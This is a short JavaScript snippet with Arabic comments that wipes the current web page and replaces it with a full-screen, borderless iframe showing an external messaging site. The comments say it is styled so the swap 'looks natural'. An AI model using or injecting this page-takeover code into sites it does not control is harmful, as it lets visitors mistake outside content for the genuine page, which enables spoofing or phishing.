// كود JavaScript لتفريغ الصفحة وإضافة المحتوى الجديد
(function() {
    // تفريغ محتوى الصفحة الحالية بالكامل
    document.documentElement.innerHTML = '';

    // إعادة كتابة محتوى الصفحة الجديد
    document.documentElement.innerHTML = `
<!DOCTYPE html>
<html>
<head>
    <title>صفحة الويب</title>
    <style>
        body, html {
            margin: 0;
            padding: 0;
            height: 100%;
            overflow: hidden; /* إخفاء التمرير لتبدو الصفحة طبيعية */
        }
        iframe {
            width: 100%;
            height: 100%;
            border: none; /* إزالة الحدود لتكامل الشكل */
        }
    </style>
</head>
<body>
    <iframe id="externalSite" src="https://sarhne.com/messages.html"></iframe>
    <script>
        // كود JavaScript لضمان التحميل السلس
        window.onload = function() {
            var iframe = document.getElementById('externalSite');
            iframe.onload = function() {
                console.log("تم تحميل الموقع الخارجي بنجاح");
            };
        };
    </script>
</body>
</html>
    `;
})();
